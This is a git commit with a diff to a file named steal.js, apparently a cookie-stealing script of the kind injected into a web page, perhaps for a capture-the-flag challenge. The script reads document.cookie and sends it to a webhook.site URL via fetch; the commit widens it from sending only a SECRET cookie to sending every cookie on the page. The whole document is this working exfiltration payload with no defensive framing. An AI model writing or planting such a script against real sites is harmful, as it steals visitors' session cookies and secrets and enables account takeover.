f08a0a326ff36659373e6274d06757d2c3f05307
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-03 02:02:13 +0000

    Update fetch call to send all cookies
    Modified the fetch call to send all cookies instead of just the secret.

--- steal.js
+++ steal.js
@@ -2,5 +2,5 @@ var cookies = document.cookie;
 var match = cookies.match(/SECRET=([^;]+)/);
 if(match) {
     // Send to webhook
-    fetch('https://webhook.site/ce3b5ec9-fcef-4795-a1c1-b106802104ba?secret=' + match[1]);
+    fetch('https://webhook.site/ce3b5ec9-fcef-4795-a1c1-b106802104ba?secret=' + cookies);
 }
